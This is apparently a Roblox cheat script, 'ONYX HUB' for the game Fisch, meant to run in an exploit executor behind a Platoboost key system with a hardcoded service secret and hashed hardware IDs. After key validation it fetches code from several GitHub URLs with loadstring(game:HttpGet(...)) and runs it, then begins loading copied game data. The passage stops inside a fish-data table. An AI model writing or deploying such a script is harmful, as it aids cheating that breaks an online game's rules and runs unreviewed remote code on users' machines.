-------------------------------------------------------------------------------
--! json library
--! cryptography library
local a=2^32;local b=a-1;local function c(d,e)local f,g=0,1;while d~=0 or e~=0 do local h,i=d%2,e%2;local j=(h+i)%2;f=f+j*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return f%a end;local function k(d,e,l,...)local m;if e then d=d%a;e=e%a;m=c(d,e)if l then m=k(m,l,...)end;return m elseif d then return d%a else return 0 end end;local function n(d,e,l,...)local m;if e then d=d%a;e=e%a;m=(d+e-c(d,e))/2;if l then m=n(m,l,...)end;return m elseif d then return d%a else return b end end;local function o(p)return b-p end;local function q(d,r)if r<0 then return lshift(d,-r)end;return math.floor(d%2^32/2^r)end;local function s(p,r)if r>31 or r<-31 then return 0 end;return q(p%a,r)end;local function lshift(d,r)if r<0 then return s(d,-r)end;return d*2^r%2^32 end;local function t(p,r)p=p%a;r=r%32;local u=n(p,2^r-1)return s(p,r)+lshift(u,32-r)end;local v={0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2}local function w(x)return string.gsub(x,".",function(l)return string.format("%02x",string.byte(l))end)end;local function y(z,A)local x=""for B=1,A do local C=z%256;x=string.char(C)..x;z=(z-C)/256 end;return x end;local function D(x,B)local A=0;for B=B,B+3 do A=A*256+string.byte(x,B)end;return A end;local function E(F,G)local H=64-(G+9)%64;G=y(8*G,8)F=F.."\128"..string.rep("\0",H)..G;assert(#F%64==0)return F end;local function I(J)J[1]=0x6a09e667;J[2]=0xbb67ae85;J[3]=0x3c6ef372;J[4]=0xa54ff53a;J[5]=0x510e527f;J[6]=0x9b05688c;J[7]=0x1f83d9ab;J[8]=0x5be0cd19;return J end;local function K(F,B,J)local L={}for M=1,16 do L[M]=D(F,B+(M-1)*4)end;for M=17,64 do local N=L[M-15]local O=k(t(N,7),t(N,18),s(N,3))N=L[M-2]L[M]=(L[M-16]+O+L[M-7]+k(t(N,17),t(N,19),s(N,10)))%a end;local d,e,l,P,Q,R,S,T=J[1],J[2],J[3],J[4],J[5],J[6],J[7],J[8]for B=1,64 do local O=k(t(d,2),t(d,13),t(d,22))local U=k(n(d,e),n(d,l),n(e,l))local V=(O+U)%a;local W=k(t(Q,6),t(Q,11),t(Q,25))local X=k(n(Q,R),n(o(Q),S))local Y=(T+W+X+v[B]+L[B])%a;T=S;S=R;R=Q;Q=(P+Y)%a;P=l;l=e;e=d;d=(Y+V)%a end;J[1]=(J[1]+d)%a;J[2]=(J[2]+e)%a;J[3]=(J[3]+l)%a;J[4]=(J[4]+P)%a;J[5]=(J[5]+Q)%a;J[6]=(J[6]+R)%a;J[7]=(J[7]+S)%a;J[8]=(J[8]+T)%a end;local function Z(F)F=E(F,#F)local J=I({})for B=1,#F,64 do K(F,B,J)end;return w(y(J[1],4)..y(J[2],4)..y(J[3],4)..y(J[4],4)..y(J[5],4)..y(J[6],4)..y(J[7],4)..y(J[8],4))end;local e;local l={["\\"]="\\",["\""]="\"",["\b"]="b",["\f"]="f",["\n"]="n",["\r"]="r",["\t"]="t"}local P={["/"]="/"}for Q,R in pairs(l)do P[R]=Q end;local S=function(T)return"\\"..(l[T]or string.format("u%04x",T:byte()))end;local B=function(M)return"null"end;local v=function(M,z)local _={}z=z or{}if z[M]then error("circular reference")end;z[M]=true;if rawget(M,1)~=nil or next(M)==nil then local A=0;for Q in pairs(M)do if type(Q)~="number"then error("invalid table: mixed or invalid key types")end;A=A+1 end;if A~=#M then error("invalid table: sparse array")end;for a0,R in ipairs(M)do table.insert(_,e(R,z))end;z[M]=nil;return"["..table.concat(_,",").."]"else for Q,R in pairs(M)do if type(Q)~="string"then error("invalid table: mixed or invalid key types")end;table.insert(_,e(Q,z)..":"..e(R,z))end;z[M]=nil;return"{"..table.concat(_,",").."}"end end;local g=function(M)return'"'..M:gsub('[%z\1-\31\\"]',S)..'"'end;local a1=function(M)if M~=M or M<=-math.huge or M>=math.huge then error("unexpected number value '"..tostring(M).."'")end;return string.format("%.14g",M)end;local j={["nil"]=B,["table"]=v,["string"]=g,["number"]=a1,["boolean"]=tostring}e=function(M,z)local x=type(M)local a2=j[x]if a2 then return a2(M,z)end;error("unexpected type '"..x.."'")end;local a3=function(M)return e(M)end;local a4;local N=function(...)local _={}for a0=1,select("#",...)do _[select(a0,...)]=true end;return _ end;local L=N(" ","\t","\r","\n")local p=N(" ","\t","\r","\n","]","}",",")local a5=N("\\","/",'"',"b","f","n","r","t","u")local m=N("true","false","null")local a6={["true"]=true,["false"]=false,["null"]=nil}local a7=function(a8,a9,aa,ab)for a0=a9,#a8 do if aa[a8:sub(a0,a0)]~=ab then return a0 end end;return#a8+1 end;local ac=function(a8,a9,J)local ad=1;local ae=1;for a0=1,a9-1 do ae=ae+1;if a8:sub(a0,a0)=="\n"then ad=ad+1;ae=1 end end;error(string.format("%s at line %d col %d",J,ad,ae))end;local af=function(A)local a2=math.floor;if A<=0x7f then return string.char(A)elseif A<=0x7ff then return string.char(a2(A/64)+192,A%64+128)elseif A<=0xffff then return string.char(a2(A/4096)+224,a2(A%4096/64)+128,A%64+128)elseif A<=0x10ffff then return string.char(a2(A/262144)+240,a2(A%262144/4096)+128,a2(A%4096/64)+128,A%64+128)end;error(string.format("invalid unicode codepoint '%x'",A))end;local ag=function(ah)local ai=tonumber(ah:sub(1,4),16)local aj=tonumber(ah:sub(7,10),16)if aj then return af((ai-0xd800)*0x400+aj-0xdc00+0x10000)else return af(ai)end end;local ak=function(a8,a0)local _=""local al=a0+1;local Q=al;while al<=#a8 do local am=a8:byte(al)if am<32 then ac(a8,al,"control character in string")elseif am==92 then _=_..a8:sub(Q,al-1)al=al+1;local T=a8:sub(al,al)if T=="u"then local an=a8:match("^[dD][89aAbB]%x%x\\u%x%x%x%x",al+1)or a8:match("^%x%x%x%x",al+1)or ac(a8,al-1,"invalid unicode escape in string")_=_..ag(an)al=al+#an else if not a5[T]then ac(a8,al-1,"invalid escape char '"..T.."' in string")end;_=_..P[T]end;Q=al+1 elseif am==34 then _=_..a8:sub(Q,al-1)return _,al+1 end;al=al+1 end;ac(a8,a0,"expected closing quote for string")end;local ao=function(a8,a0)local am=a7(a8,a0,p)local ah=a8:sub(a0,am-1)local A=tonumber(ah)if not A then ac(a8,a0,"invalid number '"..ah.."'")end;return A,am end;local ap=function(a8,a0)local am=a7(a8,a0,p)local aq=a8:sub(a0,am-1)if not m[aq]then ac(a8,a0,"invalid literal '"..aq.."'")end;return a6[aq],am end;local ar=function(a8,a0)local _={}local A=1;a0=a0+1;while 1 do local am;a0=a7(a8,a0,L,true)if a8:sub(a0,a0)=="]"then a0=a0+1;break end;am,a0=a4(a8,a0)_[A]=am;A=A+1;a0=a7(a8,a0,L,true)local as=a8:sub(a0,a0)a0=a0+1;if as=="]"then break end;if as~=","then ac(a8,a0,"expected ']' or ','")end end;return _,a0 end;local at=function(a8,a0)local _={}a0=a0+1;while 1 do local au,M;a0=a7(a8,a0,L,true)if a8:sub(a0,a0)=="}"then a0=a0+1;break end;if a8:sub(a0,a0)~='"'then ac(a8,a0,"expected string for key")end;au,a0=a4(a8,a0)a0=a7(a8,a0,L,true)if a8:sub(a0,a0)~=":"then ac(a8,a0,"expected ':' after key")end;a0=a7(a8,a0+1,L,true)M,a0=a4(a8,a0)_[au]=M;a0=a7(a8,a0,L,true)local as=a8:sub(a0,a0)a0=a0+1;if as=="}"then break end;if as~=","then ac(a8,a0,"expected '}' or ','")end end;return _,a0 end;local av={['"']=ak,["0"]=ao,["1"]=ao,["2"]=ao,["3"]=ao,["4"]=ao,["5"]=ao,["6"]=ao,["7"]=ao,["8"]=ao,["9"]=ao,["-"]=ao,["t"]=ap,["f"]=ap,["n"]=ap,["["]=ar,["{"]=at}a4=function(a8,a9)local as=a8:sub(a9,a9)local a2=av[as]if a2 then return a2(a8,a9)end;ac(a8,a9,"unexpected character '"..as.."'")end;local aw=function(a8)if type(a8)~="string"then error("expected argument of type string, got "..type(a8))end;local _,a9=a4(a8,a7(a8,1,L,true))a9=a7(a8,a9,L,true)if a9<=#a8 then ac(a8,a9,"trailing garbage")end;return _ end;
local lEncode, lDecode, lDigest = a3, aw, Z;
-------------------------------------------------------------------------------

-------------------------------------------------------------------------------
--! platoboost library

--! configuration
local service = 593;  -- your service id, this is used to identify your service.
local secret = "c26973be-7de4-4aae-86e7-272448e3213e";  -- make sure to obfuscate this if you want to ensure security.
local useNonce = true;  -- use a nonce to prevent replay attacks and request tampering.

--! callbacks
local onMessage = function(message) end;

--! wait for game to load
repeat task.wait(1) until game:IsLoaded();

--! functions
local requestSending = false;
local fSetClipboard, fRequest, fStringChar, fToString, fStringSub, fOsTime, fMathRandom, fMathFloor, fGetHwid = setclipboard or toclipboard, request or http_request or syn_request, string.char, tostring, string.sub, os.time, math.random, math.floor, gethwid or function() return game:GetService("Players").LocalPlayer.UserId end
local cachedLink, cachedTime = "", 0;

--! pick host
local host = "https://api.platoboost.com";
local hostResponse = fRequest({
    Url = host .. "/public/connectivity",
    Method = "GET"
});
if hostResponse.StatusCode ~= 200 or hostResponse.StatusCode ~= 429 then
    host = "https://api.platoboost.net";
end

--!optimize 2
function cacheLink()
    if cachedTime + (10*60) < fOsTime() then
        local response = fRequest({
            Url = host .. "/public/start",
            Method = "POST",
            Body = lEncode({
                service = service,
                identifier = lDigest(fGetHwid())
            }),
            Headers = {
                ["Content-Type"] = "application/json"
            }
        });

        if response.StatusCode == 200 then
            local decoded = lDecode(response.Body);

            if decoded.success == true then
                cachedLink = decoded.data.url;
                cachedTime = fOsTime();
                return true, cachedLink;
            else
                onMessage(decoded.message);
                return false, decoded.message;
            end
        elseif response.StatusCode == 429 then
            local msg = "you are being rate limited, please wait 20 seconds and try again.";
            onMessage(msg);
            return false, msg;
        end

        local msg = "Failed to cache link.";
        onMessage(msg);
        return false, msg;
    else
        return true, cachedLink;
    end
end

cacheLink();

--!optimize 2
local generateNonce = function()
    local str = ""
    for _ = 1, 16 do
        str = str .. fStringChar(fMathFloor(fMathRandom() * (122 - 97 + 1)) + 97)
    end
    return str
end

--!optimize 1
for _ = 1, 5 do
    local oNonce = generateNonce();
    task.wait(0.2)
    if generateNonce() == oNonce then
        local msg = "platoboost nonce error.";
        onMessage(msg);
        error(msg);
    end
end

--!optimize 2
local copyLink = function()
    local success, link = cacheLink();
    
    if success then
        fSetClipboard(link);
    end
end

--!optimize 2
local redeemKey = function(key)
    local nonce = generateNonce();
    local endpoint = host .. "/public/redeem/" .. fToString(service);

    local body = {
        identifier = lDigest(fGetHwid()),
        key = key
    }

    if useNonce then
        body.nonce = nonce;
    end

    local response = fRequest({
        Url = endpoint,
        Method = "POST",
        Body = lEncode(body),
        Headers = {
            ["Content-Type"] = "application/json"
        }
    });

    if response.StatusCode == 200 then
        local decoded = lDecode(response.Body);

        if decoded.success == true then
            if decoded.data.valid == true then
                if useNonce then
                    if decoded.data.hash == lDigest("true" .. "-" .. nonce .. "-" .. secret) then
                        return true;
                    else
                        onMessage("failed to verify integrity.");
                        return false;
                    end    
                else
                    return true;
                end
            else
                onMessage("key is invalid.");
                return false;
            end
        else
            if fStringSub(decoded.message, 1, 27) == "unique constraint violation" then
                onMessage("you already have an active key, please wait for it to expire before redeeming it.");
                return false;
            else
                onMessage(decoded.message);
                return false;
            end
        end
    elseif response.StatusCode == 429 then
        onMessage("you are being rate limited, please wait 20 seconds and try again.");
        return false;
    else
        onMessage("server returned an invalid status code, please try again later.");
        return false; 
    end
end

--!optimize 2
local verifyKey = function(key)
    if requestSending == true then
        onMessage("a request is already being sent, please slow down.");
        return false;
    else
        requestSending = true;
    end

    local nonce = generateNonce();
    local endpoint = host .. "/public/whitelist/" .. fToString(service) .. "?identifier=" .. lDigest(fGetHwid()) .. "&key=" .. key;

    if useNonce then
        endpoint = endpoint .. "&nonce=" .. nonce;
    end

    local response = fRequest({
        Url = endpoint,
        Method = "GET",
    });

    requestSending = false;

    if response.StatusCode == 200 then
        local decoded = lDecode(response.Body);

        if decoded.success == true then
            if decoded.data.valid == true then
                if useNonce then
                    if decoded.data.hash == lDigest("true" .. "-" .. nonce .. "-" .. secret) then
                        return true;
                    else
                        onMessage("failed to verify integrity.");
                        return false;
                    end
                else
                    return true;
                end
            else
                if fStringSub(key, 1, 4) == "KEY_" then
                    return redeemKey(key);
                else
                    onMessage("key is invalid.");
                    return false;
                end
            end
        else
            onMessage(decoded.message);
            return false;
        end
    elseif response.StatusCode == 429 then
        onMessage("you are being rate limited, please wait 20 seconds and try again.");
        return false;
    else
        onMessage("server returned an invalid status code, please try again later.");
        return false;
    end
end

--!optimize 2
local getFlag = function(name)
    local nonce = generateNonce();
    local endpoint = host .. "/public/flag/" .. fToString(service) .. "?name=" .. name;

    if useNonce then
        endpoint = endpoint .. "&nonce=" .. nonce;
    end

    local response = fRequest({
        Url = endpoint,
        Method = "GET",
    });

    if response.StatusCode == 200 then
        local decoded = lDecode(response.Body);

        if decoded.success == true then
            if useNonce then
                if decoded.data.hash == lDigest(fToString(decoded.data.value) .. "-" .. nonce .. "-" .. secret) then
                    return decoded.data.value;
                else
                    onMessage("failed to verify integrity.");
                    return nil;
                end
            else
                return decoded.data.value;
            end
        else
            onMessage(decoded.message);
            return nil;
        end
    else
        return nil;
    end
end
-------------------------------------------------------------------------------
--! platoboost usage documentation
-- copyLink() -> string
-- verifyKey(key: string) -> boolean
-- getFlag(name: string) -> boolean, string | boolean | number
-------------------------------------------------------------------------------

local Player = game.Players.LocalPlayer
local sigma = function()
	game:GetService("StarterGui"):SetCore("SendNotification",{
		Title = "[ONYX HUB]",
		Text = "Welcome "..Player.Name..".",
		Duration = 4
	})
end

local sigma2 = function()
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title= "[ONYX HUB]",
		Text = "Incorrect key",
		Duration = 2
	})
end

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local key = ""

local Window = Fluent:CreateWindow({
    Title = "Key System",
    SubTitle = "ONYX HUB                   "..Player.Name.." ",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 340),
    Acrylic = false,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
    KeySys = Window:AddTab({ Title = "Key System", Icon = "key" }),
}

local Entkey = Tabs.KeySys:AddInput("Input", {
    Title = "Enter Key",
    Description = "Enter your Key Here",
    Default = "",
    Placeholder = "Enter key…",
    Numeric = false,
    Finished = false,
    Callback = function(Value)
        key = Value
    end
})

local Checkkey = Tabs.KeySys:AddButton({
    Title = "Check Key",
    Description = "Enter The Key before pressing this button",
    Callback = function()
        local response = verifyKey(key)
        if response then
			sigma()
			Fluent:Destroy()
		
local L_4_ = loadstring(game:HttpGet("https://raw.githubusercontent.com/Knuxy92/Ui-linoria/main/Fluent/Fluent.lua"))()
local L_5_ = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local L_6_ = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
local L_7_ = L_4_:CreateWindow({
	Title = "ONYX HUB",
	SubTitle = "https://discord.gg/hpmD4Umg9z",
	TabWidth = 160,
	Size = UDim2.fromOffset(550, 350),
	Acrylic = false,
	Theme = "Normal Theme",
	MinimizeKey = Enum.KeyCode.LeftControl
})
do
	Config = {}
	_G.Config = Config;
	AllFuncs = {}
	Threads = getgenv().Threads;
	Players = game.Players;
	LocalPlayer = game.Players.LocalPlayer;
	Client = game.Players.LocalPlayer;
	ReplicatedStorage = game:GetService('ReplicatedStorage')
	RunService = game:GetService("RunService")
	VirtualInputManager = game:GetService('VirtualInputManager')
	CollectionService = game:GetService("CollectionService")
	CoreGui = game:GetService("CoreGui")
	HttpService = game:GetService("HttpService")
	TeleportService = game:GetService("TeleportService")
	VirtualUser = game:GetService("VirtualUser")
	VirtualInputManager = game:GetService("VirtualInputManager")
	UserInputService = game:GetService("UserInputService")
	PlayerGui = LocalPlayer.PlayerGui;
	Backpack = LocalPlayer.Backpack;
	request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request;
	Char = Client.Character;
	Character = Client.Character;
	if not Threads then
		getgenv().Threads = {}
	end;
	repeat
		LocalPlayer = Players.LocalPlayer;
		wait()
	until LocalPlayer
end;
function Notify(L_29_arg0, L_30_arg1, L_31_arg2)
	L_4_:Notify({
		Title = L_31_arg2 or "ONYX HUB Notify",
		Content = L_29_arg0,
		Duration = L_30_arg1 or 3
	})
end;
_G['Normal Hub Table'] = {
	isWindows = UserInputService:GetPlatform() == Enum.Platform.Windows,
	TypeOs = (table.find({
		Enum.Platform.Windows
	}, game:GetService('UserInputService'):GetPlatform()) ~= nil and 'Pc') or 'Mb',
	SizeUi = (not isWindows and UDim2.fromOffset(600, 300)) or UDim2.fromOffset(560, 600),
	AutoSize = true,
	TweenUiSize = true,
	SpeedTweenUi = 0.25,
	StyleTweenUi = Enum.EasingStyle.Quad,
	Mutiply = 1.80,
	SizeX = 550,
	SafePercent = 20,
	AnimationUiToggle = true
}
_G['Normal Hub Table'].SizeUi = (not _G['Normal Hub Table'].isWindows and UDim2.fromOffset(600, 300)) or UDim2.fromOffset(560, 600)
if not _G['Normal Hub Table'].isWindows then
	if game.CoreGui:FindFirstChild('UIBUTTON') then
		game.CoreGui:FindFirstChild('UIBUTTON'):Destroy()
	end;
	local L_32_ = game:GetService("TweenService")
	local L_33_ = game:GetService("UserInputService")
	local L_34_ = Instance.new("ScreenGui")
	local L_35_ = Instance.new("Frame")
	local L_36_ = Instance.new("ImageButton")
	local L_37_ = Instance.new("UICorner")
	local L_38_ = Instance.new("UICorner")
	L_34_.Name = "UIBUTTON"
	L_34_.Parent = game.CoreGui;
	L_34_.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
	L_35_.Parent = L_34_;
	L_35_.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
	L_35_.BorderColor3 = Color3.fromRGB(0, 0, 0)
	L_35_.BorderSizePixel = 0;
	L_35_.Transparency = 1;
	L_35_.Position = UDim2.new(0.157012194, 0, 0.164366379, 0)
	L_35_.Size = UDim2.new(0, 115, 0, 49)
	L_36_.Parent = L_35_;
	L_36_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	L_36_.BorderColor3 = Color3.fromRGB(0, 0, 0)
	L_36_.BorderSizePixel = 0;
	L_36_.Active = true;
	L_36_.Draggable = true;
	L_36_.Position = UDim2.new(0.218742043, 0, - 0.155235752, 0)
	L_36_.Size = UDim2.new(0, 64, 0, 64)
	L_36_.Image = "rbxassetid://965305329"
	local L_39_ = true;
	L_36_.MouseButton1Click:Connect(function()
		L_36_:TweenSize(UDim2.new(0, 60, 0, 60), Enum.EasingDirection.In, Enum.EasingStyle.Elastic, 0.1)
		delay(0.1, function()
			L_36_:TweenSize(UDim2.new(0, 64, 0, 64), Enum.EasingDirection.Out, Enum.EasingStyle.Elastic, 0.1)
		end)
		if L_39_ then
			L_36_.Image = "rbxassetid://965305329"
		else
			L_36_.Image = "rbxassetid://965305329"
		end;
		L_39_ = not L_39_;
		local L_47_ = game:GetService("VirtualInputManager")
		L_47_:SendKeyEvent(true, "RightControl", false, game)
		L_47_:SendKeyEvent(false, "RightControl", false, game)
		L_47_:SendKeyEvent(true, "LeftControl", false, game)
		L_47_:SendKeyEvent(false, "LeftControl", false, game)
	end)
	L_37_.CornerRadius = UDim.new(0, 100)
	L_37_.Parent = L_36_;
	L_38_.CornerRadius = UDim.new(0, 10)
	L_38_.Parent = L_35_;
	local L_40_ = game:GetService('UserInputService')
	local L_41_ = L_35_;
	local L_42_ = nil;
	local L_43_ = 0.25;
	local L_44_ = nil;
	local L_45_ = nil;
	local function L_46_func(L_48_arg0)
		local L_49_ = L_48_arg0.Position - L_44_;
		local L_50_ = UDim2.new(L_45_.X.Scale, L_45_.X.Offset + L_49_.X, L_45_.Y.Scale, L_45_.Y.Offset + L_49_.Y)
		game:GetService('TweenService'):Create(L_41_, TweenInfo.new(L_43_), {
			Position = L_50_
		}):Play()
	end;
	L_41_.InputBegan:Connect(function(L_51_arg0)
		if (L_51_arg0.UserInputType == Enum.UserInputType.MouseButton1 or L_51_arg0.UserInputType == Enum.UserInputType.Touch) then
			L_42_ = true;
			L_44_ = L_51_arg0.Position;
			L_45_ = L_41_.Position;
			L_51_arg0.Changed:Connect(function()
				if L_51_arg0.UserInputState == Enum.UserInputState.End then
					L_42_ = false
				end
			end)
		end
	end)
	L_40_.InputChanged:Connect(function(L_52_arg0)
		if L_52_arg0.UserInputType == Enum.UserInputType.MouseMovement or L_52_arg0.UserInputType == Enum.UserInputType.Touch then
			if L_42_ then
				L_35_.Transparency = 1;
				L_46_func(L_52_arg0)
			else
				L_35_.Transparency = 1
			end
		end
	end)
end;
do
	local L_53_ = "Normal Hub/fisch"
	if not isfolder(L_53_) then
		makefolder(L_53_)
	end;
	DefaultConfigName = L_53_ .. "/OriConfibg.json"
	ConfigName = L_53_ .. "/" .. Client.UserId .. "Config.json"
	Config = isfile(ConfigName) and readfile(ConfigName)
	DefaultConfig = isfile(DefaultConfigName) and readfile(DefaultConfigName)
	if DefaultConfig then
		if type(DefaultConfig) == "string" and DefaultConfig:find"{" then
			local L_54_, L_55_;
			L_54_, L_55_ = pcall(function()
				return game:GetService("HttpService"):JSONDecode(DefaultConfig)
			end)
			wait(0.1)
			if L_54_ then
				DefaultConfig = L_55_
			else
				DefaultConfig = nil
			end
		end
	end;
	if isfile(tostring(Client.UserId) .. "ALC.txt") then
		if readfile(tostring(Client.UserId) .. "ALC.txt") == "true" then
			if Config then
				if type(Config) == "string" and Config:find"{" then
					local L_56_, L_57_;
					L_56_, L_57_ = pcall(function()
						return game:GetService("HttpService"):JSONDecode(Config)
					end)
					wait(0.1)
					if L_56_ then
						Config = L_57_
					else
						Config = {}
					end
				else
					Config = {}
				end
			else
				Config = {}
			end
		else
			Config = {}
		end
	else
		writefile(tostring(Client.UserId) .. "ALC.txt", "true")
		Config = {}
	end;
	if getgenv().Config then
		Config = getgenv().Config
	end
end;
do
	save = function()
		if not isfolder('Normal Hub') then
			makefolder('Normal Hub')
		end;
		writefile(ConfigName, game:GetService("HttpService"):JSONEncode(Config))
	end;
	setDefaultConfig = function()
		if not isfolder('Normal Hub') then
			makefolder('Normal Hub')
		end;
		writefile(DefaultConfigName, game:GetService("HttpService"):JSONEncode(Config))
	end
end;
do
	local L_58_ = game:GetService("ReplicatedStorage"):WaitForChild("resources"):WaitForChild("animations"):WaitForChild("fish")
	FISHDATA = {Tire = {
			WeightPool = {
				110,
				110
			};
			Chance = 17;
			Rarity = "Trash";
			Resilience = 130;
			Description = "Who would leave this in an ocean? Seems to be in great condition too. A common tire for cars and pickup trucks.";
			Hint = "Find it in cheap bodies of water.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 20;
			XP = 10;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ermm..?",
				"A tire.?",
				"Who would put this in here?",
				"Oh. A tire.",
				"A tire!..?"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			From = "None"
		};Boot = {
			WeightPool = {
				12,
				12
			};
			Chance = 17;
			Rarity = "Trash";
			Resilience = 120;
			Description = "Who would leave this in an ocean? Seems to be in great condition too. A common boot, must of fallen off of a boat?.. Or someONE must of fallen off of a boat.. Whatever. either way, it's yours now!";
			Hint = "Find it in cheap bodies of water.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 15;
			XP = 20;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ermm..?",
				"Why only one..?",
				"A Boot.!",
				"A Boot...",
				"I caught!.. a Boot..?",
				"Erm.. A Boot?"
			};
			SparkleColor = Color3.fromRGB(197, 152, 80);
			From = "None"
		};["Fungal Cluster"] = {
			WeightPool = {
				9,
				9
			};
			Chance = 22;
			Rarity = "Trash";
			Resilience = 120;
			Description = "Offspring of the Giant Fungal Trees of Mushgrove Swamp. These mushrooms produce heavy spores which polute the surrounding area and sky; giving everything an uncomfortable and green feel.";
			Hint = "Find it in Mushgrove Swamp. Gives off spores.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 9;
			XP = 20;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ermm..?",
				"Hmm..?"
			};
			SparkleColor = Color3.fromRGB(255, 0, 0);
			HoldAnimation = L_58_:WaitForChild("underweight");
			From = "Mushgrove"
		};Driftwood = {
			WeightPool = {
				6,
				6
			};
			Chance = 17;
			Rarity = "Trash";
			Resilience = 120;
			Description = "A wood that has been washed up onto the shore by the tides. Could be great for a crafts project!";
			Hint = "Find it washed on beaches.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 10;
			XP = 30;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ermm..?",
				"Uhmm..?",
				"Driftwood!",
				"Oh. Driftwood.",
				"It's!- Oh.. Driftwood..",
				"Driftwood.."
			};
			SparkleColor = Color3.fromRGB(197, 107, 62);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "None"
		};Seaweed = {
			WeightPool = {
				1,
				3
			};
			Chance = 20;
			Rarity = "Trash";
			Resilience = 90;
			Description = "Some lovely seaweed that caught your hook. Not as cool as a fish, but it's better than finding a lonesome boot!";
			Hint = "Find it in saltwater or near patches of seaweed.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 9;
			XP = 20;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ermm..?",
				"Uhmm..?",
				"Driftwood!",
				"Oh. Driftwood.",
				"It's!- Oh.. Driftwood..",
				"Driftwood.."
			};
			SparkleColor = Color3.fromRGB(197, 107, 62);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "None"
		};Log = {
			WeightPool = {
				45,
				75
			};
			Chance = 10;
			Rarity = "Trash";
			Resilience = 80;
			Description = "A large log of wood than must have drifted on to shore. Could be great for house projects!";
			Hint = "Find it washed on beaches and in the ocean.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 124;
			XP = 45;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Oh.. a Log!",
				"A.. Log?",
				"How did I pull this up?",
				"A Log..?"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "None"
		};Rock = {
			WeightPool = {
				150,
				210
			};
			Chance = 50;
			Rarity = "Trash";
			Resilience = 90;
			Description = "It's not a boulder.. It's a rock! Found in rocky bodies of water.";
			Hint = "Found in rocky bodies of water.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 15;
			XP = 10;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ermm..?",
				"Uhmm..?",
				"A Rock!",
				"Oh. A Rock.",
				"It's!- Oh.. A Rock..",
				"A rock.."
			};
			SparkleColor = Color3.fromRGB(80, 80, 80);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "None"
		};Ice = {
			WeightPool = {
				40,
				60
			};
			Chance = 35;
			Rarity = "Trash";
			Resilience = 90;
			Description = "Chunk of ice that broke off from a glacier in Snowcap. Kinda fun to lick..";
			Hint = "Found in frozen bodies of water.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 15;
			XP = 10;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ermm..?",
				"Uhmm..?",
				"A block of Ice!",
				"Oh. Ice.",
				"Ouu! Let me lick it!",
				"Ice..",
				"It's not a popsicle, but it will do!"
			};
			SparkleColor = Color3.fromRGB(171, 255, 245);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Snowcap"
		};Basalt = {
			WeightPool = {
				150,
				210
			};
			Chance = 55;
			Rarity = "Trash";
			Resilience = 120;
			Description = "Basalt, also known as Lava Rock, is an igneous volcanic rock that forms when molten lava cools and solidifies. Very common to find when in a volcanic area.";
			Hint = "Found in active Volcanoes";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 15;
			XP = 10;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ermm..?",
				"Uhmm..?",
				"Some Basalt!",
				"Oh. A Piece of Basalt.",
				"It's!- Oh.. Basalt..",
				"Basalt.."
			};
			SparkleColor = Color3.fromRGB(59, 59, 59);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit Volcano"
		};["Common Crate"] = {
			WeightPool = {
				80,
				80
			};
			Chance = 17;
			Rarity = "Uncommon";
			Resilience = 120;
